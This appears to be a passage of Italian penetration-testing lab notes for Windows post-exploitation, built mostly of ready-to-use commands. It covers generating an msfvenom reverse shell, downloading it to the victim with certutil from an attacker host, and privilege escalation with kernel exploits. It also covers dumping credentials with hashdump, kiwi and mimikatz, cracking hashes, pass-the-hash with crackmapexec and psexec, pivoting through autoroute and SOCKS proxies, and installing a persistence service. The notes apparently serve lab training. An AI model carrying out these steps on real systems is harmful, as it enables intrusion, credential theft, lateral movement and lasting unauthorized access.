...
Il kernel (che per Windows è Windows NT) è un programma che è il cuore del OS e ha pieno controllo di ogni risorsa e hardware nel sistema. Funziona come un layer di traduzione fra HW e SW.
...
```shellscript
sessions
getprivs                            #vedi che privilegi hai
use post/multi/recon/local_exploit_suggester
    set session <NUMBER>
    run
        
#se trovi un exploit che ha un modulo di msf usa il modulo fare l exploit
sessions                            #controlla se hai creato nuova sessione
    
#usa la nuova sessione  
sessions <NUMBER>                 
getuid 
shell
...
Torna sul tuo desktop e crea un file

```shellscript
vim winExploit.txt
cd ~/Desktop/Windows-Enum/Windows-Exploit-Suggester
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database <NEWEST_ONE.xls> --systeminfo ~/Desktop/winExploit.txt
```

Analizza expoit trovati e poi cercali su http://github.com/SecWiki/windows-kernel-exploits. Una volta trovato prendi il \<exploit\_code>.exe.

Porta il file eseguibile sul target.

```bash
sessions <NUMBER>
cd C:\\Temp\\                                #se non esiste la cartella Temp creala
upload ~/Downloads/<exploit_code>.exe
shell
    .\<exploit_code>.exe                     #se non funziona segui le istruzioni per lo specifico exploit
    getuid                                   #controlla che sia "nt authority\system"
```
...
Prendi gli hash delle psw e usa gli hash per fare una authentication legittima o per SMB (per Windows) oppure fai il crack delle psw per trovare le psw in chiaro per authentication con SSH, RDP ecc...

{% hint style="warning" %}
Windows stora gli hash delle psw degli user in SAM.
{% endhint %}

***

### <mark style="color:$primary;">Dump psw in Panther\Unattend.xml</mark>

Dump psw nei file di config

{% hint style="warning" %}
Cerca questi configuration files:

* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\VICTIM - Windows

SE LI TROVI&#x20;

Prova a fare encrypt usando base64
{% endhint %}

Dopo aver guadagnato l'accesso al windows vittima fai check che non hai high privileges

{% code title="VICTIM - Windows" %}
```shellscript
net user
whoami /priv
```
...
```shellscript
msfvenom -p windows/x<64/86>/meterpreter/reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT> -f exe > payload.exe
python -m SimpleHTTPServer 80                #Se non trova python usa "python3 -m http.server 80"
```

Porta la revshell sulla vittima

{% code title="VICTIM - Windows" %}
```shellscript
cd Desktop
certutil -urlcache -f http://<IP_ATTACKER>/payload.exe                   #per fare il download del payload dal target
```
{% endcode %}

Ora dovresti avere il payload.exe sulla folder Desktop della vittima. Dunque usa il payload.

```shellscript
use multi/handler
    set payload_windows/x<64/86>/meterpreter/reverse_tcp
    set LPORT <PORT_DI_PRIMA>
    set LHOST <IP_ATTACKER>
    run
```

Ora che sei dentro cerca i file di config

{% code title="SESSION ON VICTIM msf- Windows" %}
```shellscript
cd C:\\Windows\Panther
dir
download unattend.xml                            #oppure autoattend.xml
#OPPURE
search -f Unattend.xml                           #oppure autoattend.xml
```
{% endcode %}
...
```shellscript
cat unattend.xml                                 #oppure autoattend.xml
```

Ora cerca \<Autologon> nel file e troverai:

* &#x20;\<username>administrator\</Username>&#x20;
* \<Value>PSW\_HASHED\</Value> che è l'hashed  psw&#x20;
...
Psw decriptata trovata. Per usarla...&#x20;

```shellscript
psexec.py <USER_ADMIN>@<IP_VICTIM>
whoami                                            #NT AUTHORITY\SYSTEM
```

***

### <mark style="color:$primary;">Dump psw in SAM/LSA</mark>

{% hint style="info" %}
Mimikatz estrae psw in chiaro, hashed o ticket di Kerberos dalla memoria o da lsass.exe dove le psw hashed are cached.
{% endhint %}

Dumpa SAM e LSA (per syskey)

{% tabs %}
{% tab title="hasdump" %}
Trova il modo per avere accesso alla vittima

{% code title="SESSION ON VICTIM msf - Windows" %}
```shellscript
sysinfo
getuid                                   #check che hai high priv <USER>\Administrator
pgrep lsass
migrate <PID_LSASS>
hashdump             
```
...
vim hashes.txt
     ...
     #:wq      
#Crack degli hash con johnTheRipper
gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt  
```
{% endcode %}

Ora hai le psw in chiaro.&#x20;

Puoi fare login con RDP, SSH o usa direttamente gli hash con SMB.&#x20;
{% endtab %}

{% tab title="Kiwi - msf (BEST)" %}
Trova il modo per avere accesso alla vittima
...
sysinfo
getuid                                   #check che hai high priv <USER>\Administrator
#PGREP LSASS FONDAMENTALE!!!!!!!!!!!!
pgrep lsass                                                                                                                           
migrate <PID_LSASS>
load kiwi                                #"?" per info sui comandi kiwi
creds_all                                #Prendi tutte le cred hashed
#SE NON LE HAI TROVATE USA SOTTO
lsa_dump_sam                             #Prendi le cred hashed da LSA SAM
                                         #Se c'è user senza hash allora non ha psw
#SE NON LE HAI TROVATE USA SOTTO
lsa_dump_secrets                         #Prendi le cred hashed da LSA SECRET
```
{% endcode %}
...
{% tab title="Mimikatz" %}
{% hint style="warning" %}
Richiede di avere high privilege per runnare
{% endhint %}

Trova il modo per avere accesso alla vittima

{% code title="SESSION ON VICTIM meterpreter - Windows" %}
```shellscript
getuid                                   #controlla che sia <USERNAME>\Administrator
pgrep lsass
migrate <NUMBER_RICEVUTO_DA_PGREP>
getuid                                   #controlla che sia <USERNAME>\SYSTEM
```
{% endcode %}
...
dir                                      #check che ci sta mimikatz.exe
shell
    .\mimikatz.exe                       #Esegui mimikatz
    privilege::debug                     #Aspected output "Privilege '20' OK"
    lsadump::sam                         #Cerca psw hashed per Administrator
    lsadump::secrets                     #??
    sekurlsa::logonpasswords             #Cerca psw in chiaro
```
{% endcode %}
{% endtab %}
{% endtabs %}
...
### <mark style="color:$primary;">Pass-the-Hash NTLM</mark>

Usa gli hash per accedere con credenziali.

{% code title="Meterpreter session" %}
```shellscript
getuid
sysinfo
pgrep lsass                                               #Cerca PID di lsass
migrate <PID_LSASS>                                       #Migra a lsass
getuid                                                    #NT AUTHORITY\SYSTEM
hashdump                                                  #l'hashed psw è USER:number:LM_Hash:NTLM_USER_HASH 
#Se non funziona usa modulo msf (leggi paragrafo Linux Cred Dumping)
#Salvati l'output su un file txt
CTRL+Z y
```
{% endcode %}
...
{% tab title="SMB - hash" %}
{% hint style="warning" %}
L'hash deve essere NTLM.&#x20;

Se così non è cracka la hashed psw (forse usa base64)
{% endhint %}

```shellscript
crackmapexec smb <IP> -u <USER> -H "<NTLM_USER_HASH>"    #USER=Administrator se puoi
```
...
Dopo aver confermato che funziona l'exploit aggiungi il comando che vuoi eseguire nella victim.

```shellscript
crackmapexec smb <IP> -u <USER> -H "<NTLM_USER_HASH>" -x "<CMD>"         #CMD=ipconfig,whoami,net user, 
#ci sarà molta pattumiera ma anche l'output del cmd
```
{% endtab %}

{% tab title="WinRM - hash" %}
{% hint style="warning" %}
L'hash deve essere NTLM.&#x20;
...
{% tab title="msf - hash" %}
Sfrutta un hash della psw (invece della psw in chiaro) per ottenere un remote access.

{% code title="msf" %}
```shellscript
use exploit/windows/smb/psexec
    set LPORT <PORT>
    set SMBUser <Administrator>                           #Se non hai Administrator prova con altri users
    set SMBPass <LM_hash:NTLM_Administrator>              #O LM_Hash:NTLM_USER_HASH
    set payload windows/x64/meterpreter/reverse_tcp
    set target Command                                    #Prova prima senza
    #OPPURE SE NON FUNZIONA
    set target Native\ upload                             #Prova prima senza
    exploit                                               
```
{% endcode %}

Dovrebbe aprirsi meterpreter
...
### <mark style="color:$primary;">Crack di lista hash (NTLM, MD5, SHA1)</mark>
...
## <mark style="color:$primary;">7 - Pivoting</mark>

{% embed url="https://my.ine.com/CyberSecurity/courses/c9227d5c-7010-466d-9c1a-ab4d500061aa/host-network-penetration-testing-network-based-attacks/lab/35957ba7-888a-45ad-921d-6883ce40136d" %}

Host\&NetworkPenetrationTesting:Network-BasedAttacks,Network Attacks,NetBIOS Hacking

Muoviti nei device che stanno nella rete della vittima exploitata.
...
#Exploit victim1
ipconfig
run autoroute -s <SUBNET_VICTIM2.0>/<barra>                  #Aggiungi un routing a rete di victim2 (e.g. 192.168.1.0/24)
...
{% code title="msf - me" %}
```shell
#!!STESSO TERMINALE DOVE HAI LE SESSIONI APERTE
...
{% hint style="info" %}
SE NON SAI IP DI VICTIM2

use auxiliary/scanner/discovery/arp\_sweep

&#x20;      set RHOSTS \<SUBNET\_VICTIM2.0>/\<barra>
...
```shell
sessions -i <NUMBER>                                 
portfwd add -l 1234 -p <PORTA_TROVATA> -r <IP_VICTIM2>     #[80 BUONA] 445, 3389 o web
portfwd list
```
{% endcode %}

```shellscript
#NON CHIUDERE MSFCONSOLE!!
#APRI ALTRO TERMINALE
nmap -sS -p 1234 127.0.0.1
nmap -sT -Pn -p 1234 --script smb-protocols 127.0.0.1
nmap -sT -Pn -p 1234 --script smb-enum-users 127.0.0.1
#Identifica l'exploit 
```

Procedi con MODO1 (usa un exploit) o MODO2 (usa smb)
{% endtab %}

{% tab title="SOCKS" %}
Comprometti victim1

Aggiungi route su victim1 per raggiungere victim2
...
Crea proxy SOCKS4a su port 9050 che usa la route di Metasploit.
...
use auxiliary/server/socks_proxy
    ...
    set VERSION 4a
    run
#Lascialo su un terminale e cambia terminale
```
{% endcode %}

Controlla che proxychains sia configurato per usare il proxy SOCKS.

{% code title="Kali" %}
```shell
cat /etc/proxychains4.conf                
#Aggiungi o Check che presente (premi i prima di modificare con vim)
#socks4 127.0.0.1 9050
```
{% endcode %}

Fai scan tramite il proxy

{% code title="Kali" %}
```shell
proxychains nmap <SUBNET_VICTIM2.0>/<barra> -PS445 -T4
#OUTPUT SPERATO
#Nmap scan report for pippo.ine.local (<IP_VICTIM2>)
#PORT STATE SERVICE    "le porte aperte trovate"
proxychains nmap <IP_VICTIM2> -sT -Pn -sV -p 139,445        
#SE OUTPUT dice che 445 aperta OK
#Se non funziona aggiungi anche 135,3389 e 5985
```
{% endcode %}

Se trovi porta aperta (e.g. 445)

{% code title="msf - Kali" %}
```shell
sessions -i <ID_SESSION>                        #Ritorna nella VICTIM1
migrate -N explorer.exe                         #Aumenta priv per mappare le condivisioni sotto
#Oppure pgrep explorer e poi migrate <ID>
shell
    net view \\<IP_VICTIM2> /all                #Guarda condivisioni SMB su VICTIM2
    #Leggi le share e mappali come driver locali
    net use D: \\<IP_VICTIM2>\<SHARE1>          #Monta la condiv per interaggirci come fosse locale
    net use K: \\<IP_VICTIM2>\<SHARE2>          #Monta la condiv per interaggirci come fosse local
    dir D:
    dir C:
    
    #WARNING!!!!
    #Se non hai entries prova a fare accesso con credenziali
    cat D:\\flag1.txt
    download D:\\flag1.txt
```
{% endcode %}

Dovresti trovare la flag.
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="MODO_1 - Exploit" %}
<pre class="language-shellscript"><code class="lang-shellscript">#<a data-footnote-ref href="#user-content-fn-1">TORNA </a>SUL TERMINALE DI PRIMA
use EXPLOIT/CHE/HAI/TROVATO
...
hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt smb://127.0.0.1 -s 1234
smbclient -L //127.0.0.1 -p 1234
enum4linux -a -P 1234 127.0.0.1
...
use exploit/windows/smb/psexec
    set RHOSTS 127.0.0.1
    set RPORT 1234
    set SMBUser &#x3C;USER_TROVATO>
    set SMBPass &#x3C;PSW_TROVATA>
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST &#x3C;IP_KALI>
    run

#rport 80, rhosts victim2, rhost victim2, lport 4444, exitfunc thread
</code></pre>
{% endtab %}

{% tab title="MODO_2 - Usa SMB" %}
┌────────┐              portfwd   ┌──────────┐ SMB locale             ┌──────────┐\
│ Kali              │ ──────────► │ Victim 1           │ ───────────► │ Victim 2           │\
│                     │                               │                         │                                 │                          │\
│                     │                               │ net use            │ ───────────►│ Condivisioni    │\
│                     │                               │ net view          │                                 │                          │\
│                     │                               │                         │                                 │ FLAG2              │\
│                     │                               │                         │                                 │                          │\
│ cat               │ ◄────────── │ cat D:              │                                 │                          │\
...
#Oppure pgrep explorer e poi migrate <ID>
shell
    #Fai quanto sotto in quanto smbclient non funziona qui
    net view \\<IP_VICTIM2> /all                #Guarda condivisioni SMB su VICTIM2
    #Leggi le share e mappali come driver locali
    net use D: \\<IP_VICTIM2>\<SHARE1>          #Monta la condiv per interaggirci come fosse locale
    net use K: \\<IP_VICTIM2>\<SHARE2>          #Monta la condiv per interaggirci come fosse local
...
### <mark style="color:$primary;">General session</mark>
...
{% code title="Terminal1 - msf - KALI" %}
```shell
#FAI EXPLOIT (admin/system)
background
use exploit/windows/local/persistence_service
    set SESSION <NUMBER_EXPLOIT>
    set LHOST <IP_KALI>
    set LPORT 4444
    run
```
...
```shell
#dovresti vedere che è partita una nuova session meterpreter
```

Da ora se pure fai exit su exploit/multi/handler basta rifare run su exploit/multi/handler e hai di nuovo la sessione meterpreter.

### <mark style="color:$primary;">SSH Persistence</mark>
